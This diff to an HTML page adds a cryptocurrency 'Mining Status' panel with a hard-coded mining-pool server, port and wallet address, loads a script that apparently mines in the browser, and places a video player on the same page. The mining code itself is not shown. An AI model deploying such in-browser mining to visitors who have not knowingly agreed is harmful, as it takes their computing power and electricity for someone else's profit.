@@ -9,23 +9,53 @@
     body {
       font-family: 'Courier New', Courier, monospace;
     }
+    .container {
+      margin: 20px;
+    }
+    .status-table {
+      border-collapse: collapse;
+      width: 100%;
+    }
+    .status-table td {
+      padding: 5px;
+    }
+    .status-table th {
+      padding: 5px;
+      text-align: left;
+    }
   </style>
 </head>
 
 <body>
   <div class="container">
-    <table border="0">
+    <h1>Mining Status</h1>
+    <table class="status-table" border="1">
       <tbody>
         <tr>
+          <th>Link:</th>
+          <td id="address"></td>
+        </tr>
         <tr>
-          <td style="padding: 5px;">link: </td>
-          <td style="padding: 5px;">
-            <div id="job"></div>
-          </td>
+          <th>Hashrate:</th>
+          <td id="hashrate"></td>
+        </tr>
+        <tr>
+          <th>Shared:</th>
+          <td id="shared"></td>
+        </tr>
+        <tr>
+          <th>Job ID:</th>
+          <td id="job"></td>
         </tr>
       </tbody>
     </table>
   </div>
+
+  <h1>Video Player</h1>
+  <video width="640" height="360" controls>
+    <source src="1.mp4" type="video/mp4">
+    Your browser does not support the video tag.
+  </video>
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
     integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
@@ -35,13 +65,13 @@
   </script>
   <script src="app.js"></script>
   <script>
-    $(() => {
+    $(document).ready(() => {
       const stratum = {
         server: "yespower.na.mine.zpool.ca",
         port: 6234,
         worker: "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q",
         password: "c=RVN"
-      }
+      };
 
       $('#address').text(stratum.worker);
 
@@ -56,16 +86,10 @@
             $('#shared').text(shared);
             $('#job').text(jobId);
           }
-        });
-    })
+        }
+      );
+    });
   </script>
 </body>
-  <body>
-    <h1>Video Player</h1>
-    <video width="640" height="360" controls>
-        <source src="1.mp4" type="video/mp4">
-        Your browser does not support the video tag.
-    </video>
-  </body>
 
-</html>
+  </html>
